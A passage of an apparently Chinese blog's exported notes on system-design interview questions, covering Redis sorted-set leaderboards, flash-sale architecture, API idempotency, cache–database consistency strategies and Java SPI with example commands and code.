title=\"建立公共溢出区\"></a>建立公共溢出区</h3><p>将哈希表分为公共表和溢出表，当溢出发生时，将所有溢出数据统一放到溢出区。</p>\n<h2 id=\"排行榜设计\"><a href=\"#排行榜设计\" class=\"headerlink\" title=\"排行榜设计\"></a>排行榜设计</h2><h3 id=\"基于数据库\"><a href=\"#基于数据库\" class=\"headerlink\" title=\"基于数据库\"></a>基于数据库</h3><p>基于MySQL，order by</p>\n<p>缺点：</p>\n<ul>\n<li>速度慢</li>\n</ul>\n<h3 id=\"基于Redis\"><a href=\"#基于Redis\" class=\"headerlink\" title=\"基于Redis\"></a>基于Redis</h3><p>主要考察sort set 也就是zset</p>\n<p>zadd添加数据后，zrevrange获取排序后的排名</p>\n<h3 id=\"类似于微信计数榜，如何设计不同用户看到的朋友圈的排行榜不一样\"><a href=\"#类似于微信计数榜，如何设计不同用户看到的朋友圈的排行榜不一样\" class=\"headerlink\" title=\"类似于微信计数榜，如何设计不同用户看到的朋友圈的排行榜不一样\"></a>类似于微信计数榜，如何设计不同用户看到的朋友圈的排行榜不一样</h3><p>key的设计比较重要，比如aa用户和bb用户</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">zadd step:aa 1000 小明</span><br><span class=\"line\">zadd step:bb 1000 小明</span><br></pre></td></tr></table></figure>\n\n<p>同理时间也可以通过key的设计解决</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">zadd step:aa:20210929 1000 小明</span><br><span class=\"line\">zadd step:aa:20210929 1000 小明</span><br></pre></td></tr></table></figure>\n\n<p>但是上述设计会导致每个用户都有一个排行榜，存储的数据巨大，其实可以考虑只在用户查询时通过好友关系去生成</p>\n<p>那朋友圈排行榜的：微信头像、点赞数 怎么获取呢</p>\n<ul>\n<li>可以使用hmset hash储存对象，需要时通过zset储存的key去查询即可</li>\n</ul>\n<h3 id=\"最近七天排行榜怎么弄\"><a href=\"#最近七天排行榜怎么弄\" class=\"headerlink\" title=\"最近七天排行榜怎么弄\"></a>最近七天排行榜怎么弄</h3><p>前面我们说的都是每日排行榜。</p>\n<p>假设面试官要求我们提供一个最近七天、上一周、上一月、上个季度、这一年排行榜啥的，又该怎么搞呢？</p>\n<p>其实这还是在考察你对于 Redis 有序集合 API 的掌握程度。</p>\n<p>也就是这个 API：</p>\n<ul>\n<li>zinterstore&#x2F;zunionstore destination numkeys key [key …] [weights weight [weight …]] [aggregate sum|min|max] 获取交集&#x2F;并集<ul>\n<li>zinterstore&#x2F;zunionstore其实就是交集&#x2F;并集</li>\n<li>destination 将交集&#x2F;并集的结果保存到这个键中</li>\n<li>numkeys 需要做交集&#x2F;并集的集合的个数</li>\n<li>key [key …] 具体参与交集&#x2F;并集的集合</li>\n<li>weights weight [weight …] 每个参与计算的集合的权重。在做交集&#x2F;并集计算时，每个集合中的 member 会把自己的 score 乘以这个权重，默认为 1。</li>\n<li>aggregate sum|min|max 对于各个集合中的相同元素是 sum(求和)、min(取最小值)还是max(取最大值)，默认为 sum。</li>\n</ul>\n</li>\n</ul>\n<p>比如现在有一些数据</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">zadd sport:ranking:why:20210222 43243 why 2341 mx 8764 les 42321 skr</span><br><span class=\"line\">zadd sport:ranking:why:20210223 57632 why 24354 mx 4231 les 43512 skr 5341 jay</span><br><span class=\"line\">zadd sport:ranking:why:20210224 10026 why 12344 mx 54312 les 34531 skr 43512 jay</span><br><span class=\"line\">zadd sport:ranking:why:20210225 54312 why 32451 mx 23412 les 21341 skr 56321 jay</span><br><span class=\"line\">zadd sport:ranking:why:20210226 3212 why 63421 mx 53652 les 45621 skr 5723 jay</span><br><span class=\"line\">zadd sport:ranking:why:20210227 5462 why 10158 mx 30169 les 48858 skr 66079 jay</span><br><span class=\"line\">zadd sport:ranking:why:20210228 43553 why 4451 mx 7431 les 9563 skr 8232 jay</span><br></pre></td></tr></table></figure>\n<p><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/10.png\"></p>\n<p>现在我们要求出最近 7 天的排行榜，就用下面这行命令，命令有点复杂，但是对着命令格式看，还是很清晰的：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">zunionstore sport:ranking:why:last_seven_day 7 sport:ranking:why:20210222 sport:ranking:why:20210223 sport:ranking:why:20210224 sport:ranking:why:20210225 sport:ranking:why:20210226 sport:ranking:why:20210227 sport:ranking:why:20210228 weights 1 1 1 1 1 1 1 aggregate sum</span><br></pre></td></tr></table></figure>\n<p><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/11.png\"></p>\n<p>上面用的是并集，如果我们的要求是对最近 7 天，每天都上传运动数据的人进行排序，就用交集来算。</p>\n<p>命令和上面的一致，只是把 zunionstore 修改为 zinterstore 即可。</p>\n<p>另外为了有对比，合并之后的队列名称也修改一下，命令如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">zinterstore sport:ranking:why:last_seven_day_zinterstore 7 sport:ranking:why:20210222 sport:ranking:why:20210223 sport:ranking:why:20210224 sport:ranking:why:20210225 sport:ranking:why:20210226 sport:ranking:why:20210227 sport:ranking:why:20210228 weights 1 1 1 1 1 1 1 aggregate sum</span><br></pre></td></tr></table></figure>\n<p><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/12.png\"></p>\n<p>知道最近 7 天的做法了，我们又有每一天数据，上一周、上一月、上个季度、这一年排行榜啥的不都是这个套路吗</p>\n<h3 id=\"亿级用户排行榜\"><a href=\"#亿级用户排行榜\" class=\"headerlink\" title=\"亿级用户排行榜\"></a>亿级用户排行榜</h3><h4 id=\"按段位分桶\"><a href=\"#按段位分桶\" class=\"headerlink\" title=\"按段位分桶\"></a>按段位分桶</h4><p>由于数据量比较大，所以需要类似于分成一个个小文件的思想去统计每一部分的数据</p>\n<p>比如游戏里的段位，统计国服前100，可以把王者、大师、砖石、铂金、黄金、白银、青铜 分为不同的桶，每个分段的人在不同的桶里(假设还是用zset存储用户的段位)<br>那计算全服排名即可先计算在某个段位桶的排名x,再获取这个段位桶前的所有桶的大小y1,y2…yn，排名就计算出来了x+y1+y2….yn</p>\n<h5 id=\"计算top100\"><a href=\"#计算top100\" class=\"headerlink\" title=\"计算top100\"></a>计算top100</h5><p>分桶后，直接在段位最大的桶里计算top100即可</p>\n<h4 id=\"按积分分桶\"><a href=\"#按积分分桶\" class=\"headerlink\" title=\"按积分分桶\"></a>按积分分桶</h4><p>[0-5000] [5001-10000] …..[10000000-x]</p>\n<p>这种可能会出现热点问题，比如处于0-5000区间的人会非常多（可能很多人都是没有打排位）用户的落点其实并不是均匀的，那就需要通过其他预测算法去预估每个区间的人数了</p>\n","cover":"/img/liushui.png","cover_type":"img","excerpt":"","more":"<h2 id=\"有A、B两个大文件，每个文件几十G，而内存只有4G，其中A文件存放学号-姓名，而B文件存放学号-分数，要求生成文件C，存放姓名和分数。怎么实现？\"><a href=\"#有A、B两个大文件，每个文件几十G，而内存只有4G，其中A文件存放学号-姓名，而B文件存放学号-分数，要求生成文件C，存放姓名和分数。怎么实现？\" class=\"headerlink\" title=\"有A、B两个大文件，每个文件几十G，而内存只有4G，其中A文件存放学号+姓名，而B文件存放学号+分数，要求生成文件C，存放姓名和分数。怎么实现？\"></a>有A、B两个大文件，每个文件几十G，而内存只有4G，其中A文件存放学号+姓名，而B文件存放学号+分数，要求生成文件C，存放姓名和分数。怎么实现？</h2><ul>\n<li>hash(学号)%1000，A到a0….a1000,B到b0~b1000</li>\n<li>学号相同的人一定hash到相同序号的小文件</li>\n<li>加载序号相同的小文件（比如：读取a2和b2）用map储存再按姓名+分数写入C即可</li>\n</ul>\n<h2 id=\"秒杀系统怎么设计\"><a href=\"#秒杀系统怎么设计\" class=\"headerlink\" title=\"秒杀系统怎么设计\"></a>秒杀系统怎么设计</h2><h3 id=\"秒杀存在的问题\"><a href=\"#秒杀存在的问题\" class=\"headerlink\" title=\"秒杀存在的问题\"></a>秒杀存在的问题</h3><ul>\n<li>高并发、瞬间请求量极大</li>\n<li>黄牛、黑客恶意请求</li>\n<li>链接暴露问题</li>\n<li>数据库压力问题</li>\n<li>库存不足和超卖问题</li>\n</ul>\n<h3 id=\"如何解决这些问题\"><a href=\"#如何解决这些问题\" class=\"headerlink\" title=\"如何解决这些问题\"></a>如何解决这些问题</h3><ul>\n<li>页面静态化<ul>\n<li>秒杀活动的页面，大多数内容都是固定不变的，如商品名称，商品图片等等，可以对活动页面做静态化处理，减少访问服务端的请求。秒杀用户会分布在全国各地，有的在上海，有的在深圳，地域相差很远，网速也各不相同。为了让用户最快访问到活动页面，可以使用CDN（Content Delivery Network，内容分发网络）。CDN可以让用户就近获取所需内容。</li>\n</ul>\n</li>\n<li>按钮至灰控制<ul>\n<li>秒杀活动开始前，按钮一般需要置灰的。只有时间到了，才能变得可以点击。这是防止，秒杀用户在时间快到的前几秒，疯狂请求服务器，然后秒杀时间点还没到，服务器就自己挂了。</li>\n</ul>\n</li>\n<li>服务单一职责<ul>\n<li>我们都知道微服务设计思想，也就是把各个功能模块拆分，功能那个类似的放一起，再用分布式的部署方式。</li>\n<li>如用户登录相关的，就设计个用户服务，订单相关的就搞个订单服务，再到礼物相关的就搞个礼物服务等等。那么，秒杀相关的业务逻辑也可以放到一起，搞个秒杀服务，单独给它搞个秒杀数据库。</li>\n<li>服务单一职责有个好处：如果秒杀没抗住高并发的压力，秒杀库崩了，服务挂了，也不会影响到系统的其他服务。</li>\n</ul>\n</li>\n<li>秒杀链接加盐<ul>\n<li>链接如果明文暴露的话，会有人获取到请求Url，提前秒杀了。因此，需要给秒杀链接加盐。可以把URL动态化，如通过MD5加密算法加密随机的字符串去做url。</li>\n</ul>\n</li>\n<li>限流<ul>\n<li>一般有两种方式限流：nginx限流和redis限流。</li>\n<li>为了防止某个用户请求过于频繁，我们可以对同一用户限流；</li>\n<li>为了防止黄牛模拟几个用户请求，我们可以对某个IP进行限流；</li>\n<li>为了防止有人使用代理，每次请求都更换IP请求，我们可以对接口进行限流。</li>\n<li>为了防止瞬时过大的流量压垮系统，还可以使用阿里的Sentinel、Hystrix组件进行限流。</li>\n</ul>\n</li>\n<li>分布式锁<ul>\n<li>可以使用redis分布式锁解决超卖问题。</li>\n<li>使用Redis的SET EX PX NX + 校验唯一随机值,再删除释放锁。</li>\n<li>为了更严谨，一般也是用lua脚本代替。lua脚本如下：</li>\n</ul>\n</li>\n<li>MQ异步处理<ul>\n<li>如果瞬间流量特别大，可以使用消息队列削峰，异步处理。用户请求过来的时候，先放到消息队列，再拿出来消费。</li>\n</ul>\n</li>\n<li>限流&amp;降级&amp;熔断<ul>\n<li>限流，就是限制请求，防止过大的请求压垮服务器；</li>\n<li>降级，就是秒杀服务有问题了，就降级处理，不要影响别的服务；</li>\n<li>熔断，服务有问题就熔断，一般熔断降级是一起出现。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"产品上线出问题怎么定位错误\"><a href=\"#产品上线出问题怎么定位错误\" class=\"headerlink\" title=\"产品上线出问题怎么定位错误\"></a>产品上线出问题怎么定位错误</h2><ul>\n<li>复现问题</li>\n<li>top jstack</li>\n</ul>\n<h2 id=\"大量并发查询用户商品信息，MySQL压力大查询慢，保证速度怎么优化方案\"><a href=\"#大量并发查询用户商品信息，MySQL压力大查询慢，保证速度怎么优化方案\" class=\"headerlink\" title=\"大量并发查询用户商品信息，MySQL压力大查询慢，保证速度怎么优化方案\"></a>大量并发查询用户商品信息，MySQL压力大查询慢，保证速度怎么优化方案</h2><p>读写分离</p>\n<h2 id=\"海量日志数据，提取出某日访问百度次数最多的那个IP。\"><a href=\"#海量日志数据，提取出某日访问百度次数最多的那个IP。\" class=\"headerlink\" title=\"海量日志数据，提取出某日访问百度次数最多的那个IP。\"></a>海量日志数据，提取出某日访问百度次数最多的那个IP。</h2><ul>\n<li>可以考虑采用“分而治之”的思想，按照IP地址的Hash(IP)%1024值，把海量IP日志分别存储到1024个小文件中。这样，每个小文件最多包含4MB个IP地址</li>\n<li>对于每一个小文件，可以构建一个IP为key，出现次数为value的Hash map，同时记录当前出现次数最多的那个IP地址</li>\n<li>可以得到1024个小文件中的出现次数最多的IP，再依据常规的排序算法得到总体上出现次数最多的IP；</li>\n</ul>\n<h2 id=\"给定a、b两个文件，各存放50亿个url，每个url各占64字节，内存限制是4G，让你找出a、b文件共同的url？\"><a href=\"#给定a、b两个文件，各存放50亿个url，每个url各占64字节，内存限制是4G，让你找出a、b文件共同的url？\" class=\"headerlink\" title=\"给定a、b两个文件，各存放50亿个url，每个url各占64字节，内存限制是4G，让你找出a、b文件共同的url？\"></a>给定a、b两个文件，各存放50亿个url，每个url各占64字节，内存限制是4G，让你找出a、b文件共同的url？</h2><h3 id=\"方案1\"><a href=\"#方案1\" class=\"headerlink\" title=\"方案1\"></a>方案1</h3><ul>\n<li>遍历文件a，对每个url求取hash(url)%1000，然后根据所取得的值将url分别存储到1000个小文件（记为a0,a1,…,a999）中。这样每个小文件的大约为300M。</li>\n<li>遍历文件b，采取和a相同的方式将url分别存储到1000小文件（记为b0,b1,…,b999）。这样处理后，所有可能相同的url都在对应的小文件（a0vsb0,a1vsb1,…,a999vsb999）中，不对应的小文件不可能有相同的url。然后我们只要求出1000对小文件中相同的url即可。</li>\n<li>求每对小文件中相同的url时，可以把其中一个小文件的url存储到hash_set中。然后遍历另一个小文件的每个url，看其是否在刚才构建的hash_set中，如果是，那么就是共同的url，存到文件里面就可以了。</li>\n</ul>\n<h3 id=\"方案2\"><a href=\"#方案2\" class=\"headerlink\" title=\"方案2\"></a>方案2</h3><p>如果允许有一定的误差，使用布隆过滤器</p>\n<h2 id=\"一般内存不足而需要分析的数据又很大的问题都可以使用分治的思想，将数据hash-x-1000分为小文件再分别加载小文件到内存中处理即可\"><a href=\"#一般内存不足而需要分析的数据又很大的问题都可以使用分治的思想，将数据hash-x-1000分为小文件再分别加载小文件到内存中处理即可\" class=\"headerlink\" title=\"一般内存不足而需要分析的数据又很大的问题都可以使用分治的思想，将数据hash(x)%1000分为小文件再分别加载小文件到内存中处理即可\"></a>一般内存不足而需要分析的数据又很大的问题都可以使用分治的思想，将数据hash(x)%1000分为小文件再分别加载小文件到内存中处理即可</h2><h2 id=\"如何保证接口的幂等性\"><a href=\"#如何保证接口的幂等性\" class=\"headerlink\" title=\"如何保证接口的幂等性\"></a>如何保证接口的幂等性</h2><h3 id=\"什么是幂等性\"><a href=\"#什么是幂等性\" class=\"headerlink\" title=\"什么是幂等性\"></a>什么是幂等性</h3><p>幂等性是系统服务对外一种承诺，承诺只要调用接口成功，外部多次调用对系统的影响是一致的。声明为幂等的服务会认为外部调用失败是常态，并且失败之后必然会有重试。</p>\n<h3 id=\"什么情况下需要幂等\"><a href=\"#什么情况下需要幂等\" class=\"headerlink\" title=\"什么情况下需要幂等\"></a>什么情况下需要幂等</h3><p>以SQL为例：</p>\n<ul>\n<li>SELECT col1 FROM tab1 WHER col2&#x3D;2，无论执行多少次都不会改变状态，是天然的幂等。</li>\n<li>UPDATE tab1 SET col1&#x3D;1 WHERE col2&#x3D;2，无论执行成功多少次状态都是一致的，因此也是幂等操作。</li>\n<li>UPDATE tab1 SET col1&#x3D;col1+1 WHERE col2&#x3D;2，每次执行的结果都会发生变化，这种不是幂等的。</li>\n<li>insert into user(userid,name) values(1,’a’) 如userid为唯一主键，即重复操作上面的业务，只会插入一条用户数据，具备幂等性。<ul>\n<li>如userid不是主键，可以重复，那上面业务多次操作，数据都会新增多条，不具备幂等性。</li>\n</ul>\n</li>\n<li>delete from user where userid&#x3D;1，多次操作，结果一样，具备幂等性</li>\n</ul>\n<h3 id=\"如何保证幂等\"><a href=\"#如何保证幂等\" class=\"headerlink\" title=\"如何保证幂等\"></a>如何保证幂等</h3><h4 id=\"1、token机制\"><a href=\"#1、token机制\" class=\"headerlink\" title=\"1、token机制\"></a>1、token机制</h4><ul>\n<li>服务端提供了发送token的接口。我们在分析业务的时候，哪些业务是存在幂等问题的，就必须在执行业务前，先去获取token，服务器会把token保存到redis中。</li>\n<li>然后调用业务接口请求时，把token携带过去，一般放在请求头部。</li>\n<li>服务器判断token是否存在redis中，存在表示第一次请求，然后删除token,继续执行业务。</li>\n<li>如果判断token不存在redis中，就表示是重复操作，直接返回重复标记给client，这样就保证了业务代码，不被重复执行。</li>\n</ul>\n<p><strong>关键点 先删除token，还是后删除token。</strong></p>\n<p>后删除token：如果进行业务处理成功后，删除redis中的token失败了，这样就导致了有可能会发生重复请求，因为token没有被删除。这个问题其实是数据库和缓存redis数据不一致问题，后续会写文章进行讲解。</p>\n<p>先删除token：如果系统出现问题导致业务处理出现异常，业务处理没有成功，接口调用方也没有获取到明确的结果，然后进行重试，但token已经删除掉了，服务端判断token不存在，认为是重复请求，就直接返回了，无法进行业务处理了。</p>\n<p>先删除token可以保证不会因为重复请求，业务数据出现问题。出现业务异常，可以让调用方配合处理一下，重新获取新的token，再次由业务调用方发起重试请求就ok了。</p>\n<p><strong>token机制缺点</strong></p>\n<p>业务请求每次请求，都会有额外的请求（一次获取token请求、判断token是否存在的业务）。其实真实的生产环境中，1万请求也许只会存在10个左右的请求会发生重试，为了这10个请求，我们让9990个请求都发生了额外的请求。</p>\n<h4 id=\"2、乐观锁机制\"><a href=\"#2、乐观锁机制\" class=\"headerlink\" title=\"2、乐观锁机制\"></a>2、乐观锁机制</h4><ul>\n<li>这种方法适合在更新的场景中，update t_goods set count &#x3D; count -1 , version &#x3D; version + 1 where good_id&#x3D;2 and version &#x3D; 1</li>\n<li>根据version版本，也就是在操作库存前先获取当前商品的version版本号，然后操作的时候带上此version号。我们梳理下，我们第一次操作库存时，得到version为1，调用库存服务version变成了2；但返回给订单服务出现了问题，订单服务又一次发起调用库存服务，当订单服务传如的version还是1，再执行上面的sql语句时，就不会执行；因为version已经变为2了，where条件就不成立。这样就保证了不管调用几次，只会真正的处理一次。</li>\n<li>乐观锁主要使用于处理读多写少的问题</li>\n</ul>\n<h4 id=\"3、唯一主键\"><a href=\"#3、唯一主键\" class=\"headerlink\" title=\"3、唯一主键\"></a>3、唯一主键</h4><p>这个机制是利用了数据库的主键唯一约束的特性，解决了在insert场景时幂等问题。但主键的要求不是自增的主键，这样就需要业务生成全局唯一的主键。</p>\n<p>如果是分库分表场景下，路由规则要保证相同请求下，落地在同一个数据库和同一表中，要不然数据库主键约束就不起效果了，因为是不同的数据库和表主键不相关</p>\n<h4 id=\"4、防重表\"><a href=\"#4、防重表\" class=\"headerlink\" title=\"4、防重表\"></a>4、防重表</h4><p>使用订单号orderNo做为去重表的唯一索引，把唯一索引插入去重表，再进行业务操作，且他们在同一个事务中。这个保证了重复请求时，因为去重表有唯一约束，导致请求失败，避免了幂等问题。这里要注意的是，去重表和业务表应该在同一库中，这样就保证了在同一个事务，即使业务操作失败了，也会把去重表的数据回滚。这个很好的保证了数据一致性。</p>\n<h4 id=\"5、唯一ID\"><a href=\"#5、唯一ID\" class=\"headerlink\" title=\"5、唯一ID\"></a>5、唯一ID</h4><p>调用接口时，生成一个唯一id，redis将数据保存到集合中（去重），存在即处理过。</p>\n<h2 id=\"缓存和数据库不一致问题\"><a href=\"#缓存和数据库不一致问题\" class=\"headerlink\" title=\"缓存和数据库不一致问题\"></a>缓存和数据库不一致问题</h2><h3 id=\"更新缓存和更新数据库\"><a href=\"#更新缓存和更新数据库\" class=\"headerlink\" title=\"更新缓存和更新数据库\"></a>更新缓存和更新数据库</h3><p>大部分观点认为，做缓存不应该是去更新缓存，而是应该删除缓存，然后由下个请求去去缓存，发现不存在后再读取数据库，写入缓存。观点引用：《分布式之数据库和缓存双写一致性方案解析》孤独烟</p>\n<p>原因一：线程安全角度同时有请求A和请求B进行更新操作，那么会出现（1）线程A更新了数据库（2）线程B更新了数据库（3）线程B更新了缓存（4）线程A更新了缓存这就出现请求A更新缓存应该比请求B更新缓存早才对，但是因为网络等原因，B却比A更早更新了缓存。这就导致了脏数据，因此不考虑。</p>\n<p>原因二：业务场景角度有如下两点：</p>\n<ol>\n<li>如果你是一个写数据库场景比较多，而读数据场景比较少的业务需求，采用这种方案就会导致，数据压根还没读到，缓存就被频繁的更新，浪费性能。</li>\n<li>如果你写入数据库的值，并不是直接写入缓存的，而是要经过一系列复杂的计算再写入缓存。那么，每次写入数据库后，都再次计算写入缓存的值，无疑是浪费性能的。显然，删除缓存更为适合。</li>\n</ol>\n<h3 id=\"删缓存和更新数据库\"><a href=\"#删缓存和更新数据库\" class=\"headerlink\" title=\"删缓存和更新数据库\"></a>删缓存和更新数据库</h3><h4 id=\"先删缓存，再更新数据库\"><a href=\"#先删缓存，再更新数据库\" class=\"headerlink\" title=\"先删缓存，再更新数据库\"></a>先删缓存，再更新数据库</h4><p>该方案会导致请求数据不一致同时有一个请求A进行更新操作，另一个请求B进行查询操作。那么会出现如下情形:</p>\n<ol>\n<li>请求A进行写操作，删除缓存</li>\n<li>请求B查询发现缓存不存在</li>\n<li>请求B去数据库查询得到旧值</li>\n<li>请求B将旧值写入缓存</li>\n<li>请求A将新值写入数据库上述情况就会导致不一致的情形出现。<br>而且，如果不采用给缓存设置过期时间策略，该数据永远都是脏数据。</li>\n</ol>\n<h4 id=\"先更新数据库，再删缓存\"><a href=\"#先更新数据库，再删缓存\" class=\"headerlink\" title=\"先更新数据库，再删缓存\"></a>先更新数据库，再删缓存</h4><p>这种情况不存在并发问题么？不是的。假设这会有两个请求，一个请求A做查询操作，一个请求B做更新操作，那么会有如下情形产生</p>\n<ol>\n<li>缓存刚好失效</li>\n<li>请求A查询数据库，得一个旧值</li>\n<li>请求B将新值写入数据库</li>\n<li>请求B删除缓存</li>\n<li>请求A将查到的旧值写入缓存ok，如果发生上述情况，确实是会发生脏数据。 然而，发生这种情况的概率又有多少呢？发生上述情况有一个先天性条件，就是步骤（3）的写数据库操作比步骤（2）的读数据库操作耗时更短，才有可能使得步骤（4）先于步骤（5）。可是，大家想想，数据库的读操作的速度远快于写操作的（不然做读写分离干嘛，做读写分离的意义就是因为读操作比较快，耗资源少），因此步骤（3）耗时比步骤（2）更短，这一情形很难出现。</li>\n</ol>\n<p>先更新数据库，再删缓存依然会有问题，不过，问题出现的可能性会因为上面说的原因，变得比较低！(补充说明：我用了“先更新数据库，再删缓存”且不设过期时间策略，会不会有问题呢？由于先缓存和更新数据库不是原子的，如果更新了数据库，程序歇逼，就没删缓存，由于没有过期策略，就永远脏数据了。)所以，如果你想实现基础的缓存数据库双写一致的逻辑，那么在大多数情况下，在不想做过多设计，增加太大工作量的情况下，请先更新数据库，再删缓存!</p>\n<h3 id=\"数据库和缓存数据强一致怎么办\"><a href=\"#数据库和缓存数据强一致怎么办\" class=\"headerlink\" title=\"数据库和缓存数据强一致怎么办\"></a>数据库和缓存数据强一致怎么办</h3><p>没有办法做到绝对的一致性，这是由CAP理论决定的，缓存系统适用的场景就是非强一致性的场景，所以它属于CAP中的AP。所以，我们得委曲求全，可以去做到BASE理论中说的最终一致性。</p>\n<p>大佬们给出了到达最终一致性的解决思路，主要是针对上面两种双写策略（先删缓存，再更新数据库&#x2F;先更新数据库，再删缓存）导致的脏数据问题，进行相应的处理，来保证最终一致性。</p>\n<h4 id=\"缓存延时双删\"><a href=\"#缓存延时双删\" class=\"headerlink\" title=\"缓存延时双删\"></a>缓存延时双删</h4><p>步骤</p>\n<ol>\n<li>先删除缓存</li>\n<li>再写数据库</li>\n<li>休眠500毫秒（根据具体的业务时间来定）</li>\n<li>再次删除缓存。</li>\n</ol>\n<h4 id=\"那么，这个休眠500毫秒怎么确定的，具体该休眠多久呢？\"><a href=\"#那么，这个休眠500毫秒怎么确定的，具体该休眠多久呢？\" class=\"headerlink\" title=\"那么，这个休眠500毫秒怎么确定的，具体该休眠多久呢？\"></a>那么，这个休眠500毫秒怎么确定的，具体该休眠多久呢？</h4><p>针对上面的情形，读者应该自行评估自己的项目的读数据业务逻辑的耗时。然后写数据的休眠时间则在读数据业务逻辑的耗时基础上，加几百ms即可。这么做的目的，就是确保读请求结束，写请求可以删除读请求造成的缓存脏数据。</p>\n<h4 id=\"如果你用了mysql的读写分离架构怎么办？\"><a href=\"#如果你用了mysql的读写分离架构怎么办？\" class=\"headerlink\" title=\"如果你用了mysql的读写分离架构怎么办？\"></a>如果你用了mysql的读写分离架构怎么办？</h4><p>ok，在这种情况下，造成数据不一致的原因如下，还是两个请求，一个请求A进行更新操作，另一个请求B进行查询操作。</p>\n<ol>\n<li>请求A进行写操作，删除缓存</li>\n<li>请求A将数据写入数据库了，</li>\n<li>请求B查询缓存发现，缓存没有值</li>\n<li>请求B去从库查询，这时，还没有完成主从同步，因此查询到的是旧值</li>\n<li>请求B将旧值写入缓存</li>\n<li>数据库完成主从同步，从库变为新值上述情形，就是数据不一致的原因。还是使用双删延时策略。只是，睡眠时间修改为在主从同步的延时时间基础上，加几百ms。</li>\n</ol>\n<h4 id=\"采用这种同步淘汰策略，吞吐量降低怎么办？\"><a href=\"#采用这种同步淘汰策略，吞吐量降低怎么办？\" class=\"headerlink\" title=\"采用这种同步淘汰策略，吞吐量降低怎么办？\"></a>采用这种同步淘汰策略，吞吐量降低怎么办？</h4><p>ok，那就将第二次删除作为异步的。自己起一个线程，异步删除。这样，写的请求就不用沉睡一段时间后了，再返回。这么做，加大吞吐量。</p>\n<h4 id=\"删缓存失败了怎么办：重试机制\"><a href=\"#删缓存失败了怎么办：重试机制\" class=\"headerlink\" title=\"删缓存失败了怎么办：重试机制\"></a>删缓存失败了怎么办：重试机制</h4><p>看似问题都已经解决了，但其实，还有一个问题没有考虑到，那就是删除缓存的操作，失败了怎么办？比如延时双删的时候，第二次缓存删除失败了，那不还是没有清除脏数据吗？解决方案就是再加上一个重试机制，保证删除缓存成功</p>\n<p>流程如下所示</p>\n<ol>\n<li>更新数据库数据；</li>\n<li>缓存因为种种问题删除失败</li>\n<li>将需要删除的key发送至消息队列</li>\n<li>自己消费消息，获得需要删除的key</li>\n<li>继续重试删除操作，直到成功然而，</li>\n</ol>\n<p>该方案有一个缺点，对业务线代码造成大量的侵入。</p>\n<p>于是有了方案二，在方案二中，启动一个订阅程序去订阅数据库的binlog，获得需要操作的数据。在应用程序中，另起一段程序，获得这个订阅程序传来的信息，进行删除缓存操作</p>\n<h4 id=\"binlog\"><a href=\"#binlog\" class=\"headerlink\" title=\"binlog\"></a>binlog</h4><p>流程如下所示</p>\n<ol>\n<li>更新数据库数据</li>\n<li>数据库会将操作信息写入binlog日志当中</li>\n<li>订阅程序提取出所需要的数据以及key</li>\n<li>另起一段非业务代码，获得该信息</li>\n<li>尝试删除缓存操作，发现删除失败</li>\n<li>将这些信息发送至消息队列</li>\n<li>重新从消息队列中获得该数据，重试操作。</li>\n</ol>\n<h2 id=\"什么是SPI\"><a href=\"#什么是SPI\" class=\"headerlink\" title=\"什么是SPI\"></a>什么是SPI</h2><p>SPI 全称为 (Service Provider Interface) ，是JDK内置的一种服务提供发现机制</p>\n<h3 id=\"SPI-实践\"><a href=\"#SPI-实践\" class=\"headerlink\" title=\"SPI 实践\"></a>SPI 实践</h3><p>接下来我们来如何来利用 SPI 实现刚才提到的可拔插 IOC 容器。</p>\n<p>既然刚才都提到了 SPI 的本质就是面向接口编程，所以自然我们首先需要定义一个接口：</p>\n<p><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/1.png\" alt=\"SPI图\"></p>\n<p>其中包含了一些 Bean 容器所必须的操作：注册、获取、释放 bean。</p>\n<p>为了让其他人也能实现自己的 IOC 容器，所以我们将这个接口单独放到一个 Module 中，可供他人引入实现。</p>\n<p><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/2.png\"></p>\n<p>所以当我要实现一个单例的 IOC 容器时，我只需要新建一个 Module 然后引入刚才的模块并实现 CicadaBeanFactory 接口即可。</p>\n<p>当然其中最重要的则是需要在 resources 目录下新建一个 META-INF&#x2F;services&#x2F;top.crossoverjie.cicada.base.bean.CicadaBeanFactory 文件，文件名必须得是我们之前定义接口的全限定名（SPI 规范）。<br><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/3.png\"></p>\n<p>其中的内容便是我们自己实现类的全限定名：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">top.crossoverjie.cicada.bean.ioc.CicadaIoc</span><br></pre></td></tr></table></figure>\n<p>可以想象最终会通过这里的全限定名来反射创建对象。</p>\n<p>只不过这个过程 Java 已经提供 API 屏蔽掉了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> CicadaBeanFactory <span class=\"title function_\">getCicadaBeanFactory</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    ServiceLoader&lt;CicadaBeanFactory&gt; cicadaBeanFactories = ServiceLoader.load(CicadaBeanFactory.class);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (cicadaBeanFactories.iterator().hasNext())&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> cicadaBeanFactories.iterator().next() ;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span 